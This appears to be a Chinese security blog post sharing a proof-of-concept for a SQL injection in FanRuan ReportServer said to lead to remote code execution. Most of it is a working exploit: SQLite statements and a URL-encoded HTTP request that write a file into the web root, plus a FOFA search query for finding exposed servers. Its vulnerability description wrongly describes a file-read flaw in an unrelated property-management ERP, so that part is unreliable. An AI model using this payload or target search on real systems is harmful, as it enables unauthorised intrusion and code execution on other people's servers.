#  帆软报表ReportServer接口 SQL注入漏洞导致RCE   
小白菜安全  小白菜安全   2024-07-28 23:23  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
无  
#  漏洞描述  
  
天问物业ERP应用系统，旨在向物管公司提供降低成本、保障品质、提升效能为目标的智慧物管整体解决方案，实现物管公司的管理升级。天问物业  
ERP系统  
VacantDiscountDownLoad存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露。  
#  漏洞复现  
  
**poc**  
```
SQLite：
ATTACH DATABASE '../webapps/webroot/123.txt' as test;
CREATE TABLE test.exp(data text);
INSERT INTO test.exp(data) VALUES ('456789');

GET /webroot/decision/view/ReportServer?test=&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BF%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%2e%2e%2f%77%65%62%61%70%70%73%2f%77%65%62%72%6f%6f%74%2f%31%32%33%2e%74%78%74%27%20%61%73%20%74%65%73%74%3b'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BF%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%65%78%70%28%64%61%74%61%20%74%65%78%74%29%3b'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BF%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%65%78%70%28%64%61%74%61%29%20%56%41%4c%55%45%53%20%28%27%34%35%36%37%38%39%27%29%3b'),1,1)} HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

url+/webroot/123.txt
```  
  
批量扫描工具：  
  
没有，懒的写了，等护网结束在写个综合的吧。。。。。。。。。  
  
  
#   
# 搜索语法  
  
**fofa:**  
app  
=  
"帆软-数据决策系统"  
  
  
****  
